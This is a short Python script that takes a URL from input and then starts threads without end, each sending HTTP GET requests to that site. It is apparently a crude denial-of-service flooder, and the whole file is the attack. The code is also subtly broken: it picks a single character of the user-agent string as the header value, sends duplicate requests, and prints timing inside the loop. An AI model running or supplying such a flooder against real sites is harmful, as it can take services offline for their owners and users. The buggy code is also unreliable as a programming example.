import os
import sys
import time
import random
import requests
import threading

os.system("cls")

start = time.perf_counter()

url = str(input("URL: "))

uagent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
  
headers = {
    "User-Agent":random.choice(uagent)
}

def website():
  _ = True

  if _:
    time.sleep(0.1)
    r = requests.get(url, headers=headers)
    r = requests.get(url)
    print(r)
website()

v = True

while v:
  for _ in range(10):
    t1 = threading.Thread(target=website)

    t1.start()

    finish = time.perf_counter()

    print(f"Finished in {round(finish-start, 2)} second(s)")
